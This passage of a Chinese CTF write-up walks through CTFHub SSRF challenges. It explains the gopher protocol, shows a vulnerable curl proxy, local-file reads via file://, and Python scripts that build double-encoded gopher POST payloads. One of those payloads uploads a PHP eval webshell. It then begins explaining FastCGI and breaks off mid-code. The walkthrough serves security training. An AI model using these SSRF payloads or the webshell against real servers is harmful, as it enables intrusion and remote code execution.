id="Gopher">Gopher</h6><p>ssrf万金油----gopher</p><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p><strong>限制</strong>：gopher协议在各个编程语言中的使用限制</p><table><thead><tr><th style="text-align:center">协议</th><th style="text-align:center">PHP</th><th style="text-align:center">Java</th><th style="text-align:center">Curl</th><th style="text-align:center">Perl</th><th style="text-align:center"><a href="http://asp.net">asp.net</a></th></tr></thead><tbody><tr><td style="text-align:center">gopher</td><td style="text-align:center">–wite-curlwrappers且php版本至少5.3</td><td style="text-align:center">小于JDK1.7</td><td style="text-align:center">低版本不支持</td><td style="text-align:center">支持</td><td style="text-align:center">小于版本3</td></tr></tbody></table><p>在gopher协议中发送HTTP的数据，需要以下三步：</p><blockquote><p>1、构造HTTP数据包<br>2、URL编码、替换回车换行为%0d%0a<br>3、发送gopher协议</p></blockquote><p>协议格式</p><ul><li><p><code>gopher://IP:PORT/_+TCP/IP数据</code></p></li><li><p>例如</p><ul><li><p>http请求：<code>http://127.0.0.1/index.php?test=123</code></p><ul><li><p>http请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?test=123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure></li></ul></li><li><p>gopher请求：<code>gopher://127.0.0.1:80/_GET%20index.php?test=123%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%37%34%2e%30%2e%33%37%32%39%2e%31%36%39%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%39%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a%0d%0a</code></p><ul><li>这是HTTP请求包的url编码</li><li>gopher会访问指定IP（上面是127.0.0.1）的指定端口（上面是80，http默认端口），并传递<code>_</code>之后的数据</li></ul></li><li><p>也就是说，如果能使用gopher协议，那么只需要构造我们要用到的协议的请求数据（比如上面的HTTP），就可以实现访问</p></li></ul></li></ul><h6 id="解题开始">解题开始</h6><p>大概看了一遍就能开始了（应该）</p><p>下面是我看writeup的总结</p><p>首先先用dirsearch扫一下网站看一下有什么文件</p><p>我是直接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u url</span><br></pre></td></tr></table></figure><p>扫的太慢了（反正我没扫），直接我给出结果，发现有两个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?url=file:///var/www/html/index.php</span><br><span class="line">/?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/23.png" alt=""></p><p>然后去读源码</p><p>index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化一个新的cURL会话，并将返回的会话句柄赋值给变量 $ch。</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="comment">//使用 curl_setopt 函数设置cURL会话的选项。</span></span><br><span class="line"><span class="comment">//这里设置了URL选项 (CURLOPT_URL)，它指定了要请求的URL。URL从 $_REQUEST[&#x27;url&#x27;] 获取，这通常是一个GET或POST请求中提交的URL。</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="comment">//设置是否应返回HTTP头部。这里设置为0，意味着不返回HTTP头部，只返回主体内容。</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//这个选项指示cURL应遵循 &quot;Location&quot; 头部字段中的重定向。如果设置为1，cURL将自动遵循所有重定向。</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//执行cURL会话。这实际上发送了HTTP请求。</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="comment">//关闭cURL会话并释放所有相关资源。</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/17.png" alt=""></p><p>flag.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$_SERVER[&quot;REMOTE_ADDR&quot;] 是一个超全局变量，它存储了访问者的 IP 地址。</span></span><br><span class="line"><span class="comment">//检查访问者的 IP 地址是否不是 &quot;127.0.0.1&quot;。</span></span><br><span class="line"><span class="comment">//如果访问者的 IP 地址不是 &quot;127.0.0.1&quot;，这行代码会输出 &quot;Just View From 127.0.0.1&quot;。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从环境变量 &quot;CTFHUB&quot; 中获取值，并将其存储在变量 $flag 中。环境变量是在操作系统级别设置的，并且可以通过 PHP 的 getenv 函数访问。</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="comment">//将 $flag 的值传递给 PHP 的 md5 函数，该函数会返回 $flag 的 MD5 哈希值，并将结果存储在 $key 变量中。</span></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这行代码检查是否有一个名为 &quot;key&quot; 的 POST 参数，并且该参数的值是否与 $key 相等。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/18.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/14.png" alt=""></p><p>其实就是告诉我们如果要访问访问flag.php，我们必须要从本地访问并且需要附带正确的key</p><p>所以我们直接带上本地地址去访问flag.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/12.png" alt=""></p><p>f12后可以找到key</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/13.png" alt=""></p><p>看来应该是让我们输入这个key进入，从而得到flag，但是这里并没有提交的按钮啊，所以我们要自己构造post请求，将这个key发送过去。</p><p>然后，我们用gopher协议构造post请求。</p><p>在gopher协议中发送HTTP的数据，需要以下三步：</p><blockquote><p>1、构造HTTP数据包<br>2、URL编码、替换回车换行为%0d%0a<br>3、发送gopher协议</p></blockquote><p>1.构造HTTP数据包(POST)</p><p>在使用 Gopher协议发送 POST请求包时，<code>Host</code>、<code>Content-Type</code>和<code>Content-Length</code>请求头是必不可少的，但在 GET请求中可以没有。（提一嘴key的长度是你附带数据的字符串长度，但是应该都是36）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 36 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=你的key</span><br></pre></td></tr></table></figure><p>2.URL编码、替换回车换行为%0d%0a</p><p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行<code>curl</code>功能时，进行第二次 URL解码。</p><p>所以我们需要对构造的请求包进行两次 URL编码：</p><p>这里给个工具<a href="https://www.iamwawa.cn/urldecode.html">在线URL解码编码工具_蛙蛙工具 (iamwawa.cn)</a></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/19.png" alt=""></p><p>注意！！！：在第一次编码后的数据中，将<code>%0A</code>全部替换为<code>%0D%0A</code>。因为 Gopher协议包含的请求数据包中，可能包含有<code>=</code>、<code>&amp;</code>等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把<code>%</code>后的字节当做普通字节。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/20.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/24.png" alt=""></p><p>再进行第二次 URL编码得到如下 Gopher请求内容：</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/25.png" alt=""></p><p>因为<code>flag.php</code>中的<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>无法绕过，只能通过<code>index.php</code>页面中的<code>curl</code>功能向目标发送 POST请求（没看懂，有大佬懂请告知），构造如下Payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">80是默认http端口</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">_POST 是一个占位符，用于指示这是一个POST请求。在实际使用中，这个占位符会被具体的请求路径所替代。</span></span><br><span class="line">***10800/?url=gopher://127.0.0.1:80/_POST.....</span><br></pre></td></tr></table></figure><p>输入到网址，flag在最后面</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/22.png" alt=""></p><h6 id="脚本">脚本</h6><p>为了url编码方便，我去找了个脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">payload =\</span><br><span class="line">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=e01fdff5c126356cb64cf2436f8c7704</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">urllib.parse.quote()函数对payload进行URL编码。这是为了确保其中的特殊字符（如空格、标点符号等）在URL中正确传输。</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二次编码</span></span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line">print(result)       # 这里因为是GET请求所以要进行两次url编码</span><br></pre></td></tr></table></figure><p>在&quot;““和””&quot;中间换成你的POST数据包就行了，运行文件后自动生成<code>gopher:.....</code>,写在<code>?/url=goph....</code>就行了</p><h6 id="彩蛋">彩蛋</h6><p>在<code>***10800/flag.php</code>页面里面，看源码主要是为了伪装成本地访问，用burp抓包，修改host，并且附带key，就能触发彩蛋(右边返回的数据写着你发找到了Skill Egg Flag)</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/15.png" alt=""></p><p>返回的页面伪装成这个样子</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/16.png" alt=""></p><h5 id="5-上传文件">5.上传文件</h5><blockquote><p>这次需要上传一个文件到flag.php了.祝你好运</p></blockquote><p>其实和上一题差不多，这是这题多了个上传文件的操作。</p><p>老样子对目录用dirsearch扫发现flag.php和index.php</p><p>需要注意的是flag.php的源码的意思需要127.0.0.1访问，并且如果上传文件，就能返回flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/29.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/26.png" alt=""></p><p>然后去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/27.png" alt=""></p><p>发现没有上传文件的按钮，这里其实前端修改一下就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/28.png" alt=""></p><p>然后用burp拦截包，记得把host改成<code>127.0.0.1:80</code>（好像不用端口80也行）</p><p>把包的内容用我们上一题的脚本运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">payload =\</span><br><span class="line">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------188096258926377729394142365703</span><br><span class="line">Content-Length: 264</span><br><span class="line">Origin: http://challenge-44de14acddfd51b9.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-44de14acddfd51b9.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------188096258926377729394142365703</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------188096258926377729394142365703--</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line">print(result)       # 这里因为是GET请求所以要进行两次url编码</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/31.png" alt=""></p><p>把输出的内容输入到url里面就能返回flag了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/30.png" alt=""></p><h5 id="6-FastCGI协议">6.FastCGI协议</h5><blockquote><p>这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助</p></blockquote><p>这里我必须详细介绍一下FastCGI</p><h6 id="FastCGI详解">FastCGI详解</h6><p>在用PHP开发的过程中，我们常常使用Nginx或者Apache作为我们的Web服务器。<strong>但是PHP是如何与这些Web服务器通信的呢？</strong></p><ul><li>Apache把PHP作为一个模块集成到Apache进程(httpd)运行,这种mod_php的运行模式与PHP-CGI没有任何关系。</li><li>Nginx是通过<code>PHP-FPM</code>（PHP-FPM实现了<code>FastCGI</code>协议)来实现与PHP的通信。</li></ul><p>要谈FastCGI就必须先说说CGI。<strong>那什么是CGI？</strong></p><blockquote><p><strong>CGI</strong>(<code>Common Gateway Interface:通用网关接口</code>)是Web 服务器运行时外部程序的规范,按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与浏览器进行交互,还可通过数据库API 与数据库服务器等外部数据源进行通信,从数据库服务器中获取数据。–百度百科</p></blockquote><p><code>CGI协议</code>同 HTTP 协议一样是一个「应用层」协议，它的 功能 是为了解决 Web 服务器与 PHP 应用（或其他 Web 应用）之间的通信问题。</p><p>既然它是一个「协议」，换言之它与语言无关，即只要是实现类 CGI 协议的应用就能够实现相互的通信。</p><p><strong>CGI协议的运行原理</strong></p><ul><li>当用户访问我们的 Web 应用时，会发起一个 HTTP 请求。最终 Web 服务器接收到这个请求。</li><li>Web 服务器创建一个新的 CGI 进程。在这个进程中，将 HTTP 请求数据已一定格式解析出来，并通过标准输入和环境变量传入到 URL 指定的 CGI 程序（PHP 应用 $_SERVER）。</li><li>Web 应用程序处理完成后将返回数据写入到标准输出中，Web 服务器进程则从标准输出流中读取到响应，并采用 HTTP 协议返回给用户响应。</li></ul><p>一句话就是 Web 服务器中的 CGI 进程将接收到的 HTTP 请求数据读取到环境变量中，通过标准输入转发给 PHP 的 CGI 程序；当 PHP 程序处理完成后，Web 服务器中的 CGI 进程从标准输出中读取返回数据，并转换回 HTTP 响应消息格式，最终将页面呈献给用户。然后 Web 服务器关闭掉这个 CGI 进程。</p><p>可以说 CGI 协议特别擅长处理 Web 服务器和 Web 应用的通信问题。然而，它有一个严重缺陷，对于每个请求都需要重新 fork 出一个 CGI 进程，处理完成后立即关闭。</p><p><strong>CGI协议的缺陷</strong></p><ul><li>每次处理用户请求，都需要重新 fork CGI 子进程、销毁 CGI 子进程。</li><li>一系列的 I/O 开销降低了网络的吞吐量，造成了资源的浪费，在大并发时会产生严重的性能问题。</li></ul><p><strong>路由/结构图</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问url --&gt; 浏览器生成HTTP请求报文 --&gt; web server解析请求（例如nginx）</span></span><br><span class="line">web server 是内容的分发者</span><br><span class="line">当访问静态页面时，web server 会直接返回资源，例如index.html</span><br><span class="line">当访问动态页面时，web server 会调用解析器，例如index.php  </span><br><span class="line"><span class="comment"># --&gt; 访问CGI</span></span><br><span class="line"><span class="comment"># --&gt; CGI初始化环境，加载配置，处理请求，返回资源，结束进程 （每次处理请求后都会销毁进程，浪费资源）</span></span><br></pre></td></tr></table></figure><p>旧版本的CGI性能低下，无法应用在高并发的场景，FastCGI应运而生</p><p><strong>FastCGI协议</strong></p><p>从功能上来讲，<code>CGI</code> 协议已经完全能够解决 Web 服务器与 Web 应用之间的数据通信问题。但是由于每个请求都需要重新 fork 出 CGI 子进程导致性能堪忧，所以基于 <code>CGI</code> 协议的基础上做了改进便有了 <code>FastCGI</code> 协议，它是一种常驻型的 CGI 协议。</p><p>本质上来将 FastCGI 和 CGI 协议几乎完全一样，它们都可以从 Web 服务器里接收到相同的数据，不同之处在于采取了不同的通信方式。</p><p>再来回顾一下 CGI 协议每次接收到 HTTP 请求时，都需要经历 fork 出 CGI 子进程、执行处理并销毁 CGI 子进程这一系列工作。</p><p>而 <code>FastCGI</code> 协议采用 <strong>进程间通信(IPC)</strong> 来处理用户的请求。</p><p>FastCGI也是一种通信协议（类似HTTP协议），采用CS架构，web server 为客户端—发送请求，动态语言解析器 为服务端—处理请求</p><p><strong>路由/结构图</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问url --&gt; 浏览器生成HTTP请求报文 --&gt; web server解析请求（例如nginx）</span></span><br><span class="line">当访问index.php时，web server 会把HTTP请求转换为FastCGI请求</span><br><span class="line"><span class="comment"># --&gt;  转换为FastCGI协议格式</span></span><br><span class="line">并发送给解析器，这里以php为例</span><br><span class="line"><span class="comment"># --&gt; 发送至php-fpm    process manager</span></span><br><span class="line">php-fpm接收到请求后，把请求分配给一个worker，worker就是一个解析服务的进程（一直运行），worker根据请求信息，解析php，返回页面</span><br><span class="line">例如，招新平台运行了15个worker，（不考虑nginx处理时间）同时可以处理15个请求</span><br><span class="line"><span class="comment"># --&gt; php-fpm解析并响应</span></span><br></pre></td></tr></table></figure><p>对比图：</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/32.png" alt=""></p><p><strong>FastCGI报文格式</strong></p><p>定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> version;  <span class="comment">//版本</span></span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> type;      <span class="comment">//类型</span></span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> requestIdB1;    <span class="comment">//请求Id</span></span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> requestIdB0;        </span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> contentLengthB1;    <span class="comment">//负载长度</span></span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> contentLengthB0;</span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> paddingLength;      <span class="comment">//填充长度</span></span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> reserved;              <span class="comment">//保留字节</span></span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> contentData[contentLength]; <span 